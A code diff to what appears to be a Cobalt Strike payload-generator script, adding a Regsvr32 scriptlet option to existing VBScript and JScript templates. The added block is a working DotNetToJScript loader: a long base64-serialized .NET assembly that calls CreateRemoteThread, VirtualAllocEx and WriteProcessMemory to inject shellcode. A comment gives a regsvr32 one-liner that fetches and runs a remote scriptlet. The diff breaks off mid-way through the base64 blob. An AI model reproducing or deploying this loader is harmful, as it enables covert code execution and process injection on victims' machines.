@@ -36,7 +36,7 @@ sub setup_attack {
 		# VBScript it is!
 		$data = $data . "Dim binary : binary = \"" . %options["binary"] . "\"\r\n";
 		$data = $data . "Dim code : code = \"";
-		$data = $data . $b64payload . "\"\r\n";
+		$data = $data . $b64payload . "\";\r\n";
 
 		# variables set at this point
 
@@ -249,7 +249,7 @@ sub setup_attack {
 		# They want JScript
 		$data = $data . "var binary = \"" . %options["binary"] . "\";\r\n";
 		$data = $data . "var code = \"";
-		$data = $data . $b64payload . "\"\r\n";
+		$data = $data . $b64payload . "\";\r\n";
 
 		# variables set at this point
 
@@ -450,6 +450,226 @@ sub setup_attack {
 
 		# All inside $data at this point.
 
+	}
+	else if (%options["type"] eq "Regsvr32") {
+		# They want a regsvr32 one liner
+		# regsvr32 /s /n /u /i:http://serve/main scrobj.dll
+
+		$data = $data . "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n";
+		$data = $data . "<package>\r\n";
+		$data = $data . "  <component\r\n";
+		$data = $data . "    id=\"dummy\">\r\n";
+		$data = $data . "    <registration\r\n";
+		$data = $data . "      description=\"dummy\"\r\n";
+		$data = $data . "      progid=\"dummy\"\r\n";
+		$data = $data . "      version=\"1.00\"\r\n";
+		$data = $data . "      remotable=\"True\">\r\n";
+		$data = $data . "      <script\r\n";
+		$data = $data . "        language=\"JScript\"><![CDATA[\r\n";
+
+		$data = $data . "var binary = \"" . %options["binary"] . "\";\r\n";
+		$data = $data . "var code = \"";
+		$data = $data . $b64payload . "\";\r\n";
+
+		# variables set at this point
+
+		$data = $data . "function setversion() {\r\n";
+		$data = $data . "var shell = new ActiveXObject('WScript.Shell');\r\n";
+		$data = $data . "ver = 'v4.0.30319';\r\n";
+		$data = $data . "try {\r\n";
+		$data = $data . "shell.RegRead('HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319\\\\');\r\n";
+		$data = $data . "} catch(e) { \r\n";
+		$data = $data . "ver = 'v2.0.50727';\r\n";
+		$data = $data . "}\r\n";
+		$data = $data . "shell.Environment('Process')('COMPLUS_Version') = ver;\r\n";
+		$data = $data . "}\r\n";
+		$data = $data . "function debug(s) {}\r\n";
+		$data = $data . "function base64ToStream(b) {\r\n";
+		$data = $data . "	var enc = new ActiveXObject(\"System.Text.ASCIIEncoding\");\r\n";
+		$data = $data . "	var length = enc.GetByteCount_2(b);\r\n";
+		$data = $data . "	var ba = enc.GetBytes_4(b);\r\n";
+		$data = $data . "	var transform = new ActiveXObject(\"System.Security.Cryptography.FromBase64Transform\");\r\n";
+		$data = $data . "	ba = transform.TransformFinalBlock(ba, 0, length);\r\n";
+		$data = $data . "	var ms = new ActiveXObject(\"System.IO.MemoryStream\");\r\n";
+		$data = $data . "	ms.Write(ba, 0, (length / 4) * 3);\r\n";
+		$data = $data . "	ms.Position = 0;\r\n";
+		$data = $data . "	return ms;\r\n";
+		$data = $data . "}\r\n";
+		$data = $data . "var serialized_obj = \"AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy\"+\r\n";
+		$data = $data . "\"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph\"+\r\n";
+		$data = $data . "\"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk\"+\r\n";
+		$data = $data . "\"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD\"+\r\n";
+		$data = $data . "\"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl\"+\r\n";
+		$data = $data . "\"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU\"+\r\n";
+		$data = $data . "\"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl\"+\r\n";
+		$data = $data . "\"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90\"+\r\n";
+		$data = $data . "\"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu\"+\r\n";
+		$data = $data . "\"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH\"+\r\n";
+		$data = $data . "\"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA\"+\r\n";
+		$data = $data . "\"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw\"+\r\n";
+		$data = $data . "\"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu\"+\r\n";
+		$data = $data . "\"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA\"+\r\n";
+		$data = $data . "\"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u\"+\r\n";
+		$data = $data . "\"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5\"+\r\n";
+		$data = $data . "\"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR\"+\r\n";
+		$data = $data . "\"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA\"+\r\n";
+		$data = $data . "\"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y\"+\r\n";
+		$data = $data . "\"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh\"+\r\n";
+		$data = $data . "\"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz\"+\r\n";
+		$data = $data . "\"ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy\"+\r\n";
+		$data = $data . "\"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA\"+\r\n";
+		$data = $data . "\"AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA\"+\r\n";
+		$data = $data . "\"AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA\"+\r\n";
+		$data = $data . "\"AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT\"+\r\n";
+		$data = $data . "\"MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA\"+\r\n";
+		$data = $data . "\"Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME\"+\r\n";
+		$data = $data . "\"EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK\"+\r\n";
+		$data = $data . "\"ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK\"+\r\n";
+		$data = $data . "\"EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA\"+\r\n";
+		$data = $data . "\"BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC\"+\r\n";
+		$data = $data . "\"fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP\"+\r\n";
+		$data = $data . "\"AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj\"+\r\n";
+		$data = $data . "\"fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB\"+\r\n";
+		$data = $data . "\"AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA\"+\r\n";
+		$data = $data . "\"ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF\"+\r\n";
+		$data = $data . "\"kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG\"+\r\n";
+		$data = $data . "\"AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I\"+\r\n";
+		$data = $data . "\"qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK\"+\r\n";
+		$data = $data . "\"ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB\"+\r\n";
+		$data = $data . "\"AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG\"+\r\n";
+		$data = $data . "\"AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB\"+\r\n";
+		$data = $data . "\"AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW\"+\r\n";
+		$data = $data . "\"gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD\"+\r\n";
+		$data = $data . "\"AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG\"+\r\n";
+		$data = $data . "\"ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I\"+\r\n";
+		$data = $data . "\"+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW\"+\r\n";
+		$data = $data . "\"gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA\"+\r\n";
+		$data = $data . "\"EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW\"+\r\n";
+		$data = $data . "\"IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg\"+\r\n";
+		$data = $data . "\"1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+\"+\r\n";
+		$data = $data . "\"BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA\"+\r\n";
+		$data = $data . "\"BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA\"+\r\n";
+		$data = $data . "\"AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA\"+\r\n";
+		$data = $data . "\"CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB\"+\r\n";
+		$data = $data . "\"AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG\"+\r\n";
+		$data = $data . "\"KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ\"+\r\n";
+		$data = $data . "\"ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA\"+\r\n";
+		$data = $data . "\"hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ\"+\r\n";
+		$data = $data . "\"AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA\"+\r\n";
+		$data = $data . "\"5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ\"+\r\n";
+		$data = $data . "\"AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB\"+\r\n";
+		$data = $data . "\"aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu\"+\r\n";
+		$data = $data . "\"ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA\"+\r\n";
+		$data = $data . "\"WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB\"+\r\n";
+		$data = $data . "\"AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA\"+\r\n";
+		$data = $data . "\"AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN\"+\r\n";
+		$data = $data . "\"b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S\"+\r\n";
+		$data = $data . "\"RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU\"+\r\n";
+		$data = $data . "\"RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP\"+\r\n";
+		$data = $data . "\"TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB\"+\r\n";
+		$data = $data . "\"VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF\"+\r\n";
+		$data = $data . "\"VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT\"+\r\n";
+		$data = $data . "\"X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP\"+\r\n";
+		$data = $data . "\"VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP\"+\r\n";
+		$data = $data . "\"UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ\"+\r\n";
+		$data = $data . "\"VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU\"+\r\n";
+		$data = $data . "\"WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD\"+\r\n";
+		$data = $data . "\"UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP\"+\r\n";
+		$data = $data . "\"Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J\"+\r\n";
+		$data = $data . "\"Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X\"+\r\n";
+		$data = $data . "\"SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO\"+\r\n";
+		$data = $data . "\"SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy\"+\r\n";
+		$data = $data . "\"ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs\"+\r\n";
+		$data = $data . "\"cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl\"+\r\n";
+		$data = $data . "\"cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW\"+\r\n";
+		$data = $data . "\"YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1\"+\r\n";
+		$data = $data . "\"dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh\"+\r\n";
+		$data = $data . "\"ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli\"+\r\n";
+		$data = $data . "\"dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0\"+\r\n";
+		$data = $data . "\"cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz\"+\r\n";
+		$data = $data . "\"ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5\"+\r\n";
+		$data = $data . "\"Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3\"+\r\n";
+		$data = $data . "\"WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI\"+\r\n";
+		$data = $data . "\"RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n\"+\r\n";
+		$data = $data . "\"AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD\"+\r\n";
+		$data = $data . "\"VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz\"+\r\n";
+		$data = $data . "\"SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ\"+\r\n";
+		$data = $data . "\"bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT\"+\r\n";
+		$data = $data . "\"ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt\"+\r\n";
+		$data = $data . "\"ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp\"+\r\n";
+		$data = $data . "\"bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp\"+\r\n";
+		$data = $data . "\"YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh\"+\r\n";
+		$data = $data . "\"Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU\"+\r\n";
+		$data = $data . "\"ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB\"+\r\n";
+		$data = $data . "\"ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk\"+\r\n";
+		$data = $data . "\"SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ\"+\r\n";
+		$data = $data . "\"cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5\"+\r\n";
+		$data = $data . "\"AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX\"+\r\n";
+		$data = $data . "\"AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE\"+\r\n";
+		$data = $data . "\"IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD\"+\r\n";
+		$data = $data . "\"Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE\"+\r\n";
+		$data = $data . "\"IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA\"+\r\n";
+		$data = $data . "\"AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg\"+\r\n";
+		$data = $data . "\"BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS\"+\r\n";
+		$data = $data . "\"DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB\"+\r\n";
+		$data = $data . "\"AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT\"+\r\n";
+		$data = $data . "\"VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3\"+\r\n";
+		$data = $data . "\"NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA\"+\r\n";
+		$data = $data . "\"ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A\"+\r\n";
+		$data = $data . "\"VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA\"+\r\n";
+		$data = $data . "\"AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA\"+\r\n";
+		$data = $data . "\"BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs\"+\r\n";
+		$data = $data . "\"AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA\"+\r\n";
+		$data = $data . "\"cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA\"+\r\n";
+		$data = $data . "\"AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA\"+\r\n";
+		$data = $data . "\"UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu\"+\r\n";
+		$data = $data . "\"ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA\"+\r\n";
+		$data = $data . "\"SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV\"+\r\n";
+		$data = $data . "\"AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA\"+\r\n";
+		$data = $data . "\"AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP\"+\r\n";
+		$data = $data . "\"AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA\"+\r\n";
+		$data = $data . "\"VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw\"+\r\n";
